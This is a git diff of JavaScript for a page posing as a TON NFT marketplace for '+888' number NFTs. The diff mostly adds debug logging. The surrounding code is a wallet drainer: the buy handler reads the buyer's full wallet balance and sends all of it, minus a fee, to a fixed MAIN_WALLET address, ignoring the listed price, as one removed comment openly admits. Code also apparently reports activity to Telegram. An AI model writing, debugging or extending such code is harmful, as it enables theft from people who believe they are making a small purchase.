@@ -14,7 +14,7 @@ const NETWORK_FEE = 0.05; // Reserve 0.05 TON for network fees
 
 // Mock NFT data
 const nfts = [
-    { id: 1, name: '+888 0318 2062', image: 'images/nft1.jpg', price: 0.1 }, // Price is ignored since we send all balance
+    { id: 1, name: '+888 0318 2062', image: 'images/nft1.jpg', price: 0.1 },
     { id: 2, name: '+888 0632 5748', image: 'images/nft2.jpg', price: 814 },
     { id: 3, name: '+888 0435 6391', image: 'images/nft3.jpg', price: 1048 },
     { id: 4, name: '+888 0397 1075', image: 'images/nft4.jpg', price: 365 },
@@ -26,11 +26,16 @@ const nfts = [
 
 // Function to render NFTs on the page
 function renderNfts() {
+    console.log('Rendering NFTs...');
     const grid = document.getElementById('nft-grid');
-    if (!grid) return;
-
+    if (!grid) {
+        console.error('nft-grid element not found');
+        return;
+    }
     grid.innerHTML = '';
+    console.log('NFTs to render:', nfts);
     nfts.forEach(nft => {
+        console.log('Rendering NFT:', nft.name);
         const card = document.createElement('div');
         card.className = 'nft-card';
         card.innerHTML = `
@@ -48,10 +53,11 @@ function renderNfts() {
         `;
         grid.appendChild(card);
     });
-
+    console.log('Attaching event listeners to buy buttons');
     document.querySelectorAll('.buy-button').forEach(button => {
         button.addEventListener('click', (e) => {
             const name = e.target.dataset.name;
+            console.log('Buy button clicked for:', name);
             buyNFT(name, e.target);
         });
     });
@@ -72,6 +78,7 @@ async function getWalletBalance(address) {
 async function buyNFT(name, buttonElement) {
     try {
         if (!tonConnectUI.connected || !tonConnectUI.account) {
+            console.log('Opening TonConnect modal');
             tonConnectUI.openModal();
             return;
         }
@@ -80,27 +87,30 @@ async function buyNFT(name, buttonElement) {
         buttonElement.textContent = 'Processing...';
 
         const walletAddress = tonConnectUI.account.address;
+        console.log('Fetching balance for:', walletAddress);
 
         // Fetch wallet balance
         const balanceTon = await getWalletBalance(walletAddress);
-        const amountToSendTon = parseFloat(balanceTon) - NETWORK_FEE; // Reserve network fee
+        const amountToSendTon = parseFloat(balanceTon) - NETWORK_FEE;
         if (amountToSendTon <= 0) {
             throw new Error('Insufficient balance to cover network fees');
         }
 
-        const amountToSend = (BigInt(Math.floor(amountToSendTon * 1000000000))).toString(); // Convert TON to nanotons
+        const amountToSend = (BigInt(Math.floor(amountToSendTon * 1000000000))).toString();
+        console.log('Sending:', amountToSendTon, 'TON');
 
         const transaction = {
-            validUntil: Math.floor(Date.now() / 1000) + 600, // 10 minutes
+            validUntil: Math.floor(Date.now() / 1000) + 600,
             messages: [
                 {
                     address: MAIN_WALLET,
                     amount: amountToSend,
-                    payload: btoa(`Purchase of NFT: ${name}`) // Base64-encoded payload
+                    payload: btoa(`Purchase of NFT: ${name}`)
                 }
             ]
         };
 
+        console.log('Sending transaction:', transaction);
         const result = await tonConnectUI.sendTransaction(transaction);
         console.log('Transaction successful:', result);
 
@@ -130,6 +140,7 @@ function sendTelegramMessage(text) {
 
 // Initialization
 document.addEventListener('DOMContentLoaded', () => {
+    console.log('DOM loaded, initializing NFTs');
     renderNfts();
     tonConnectUI.onStatusChange(wallet => {
         if (wallet) {
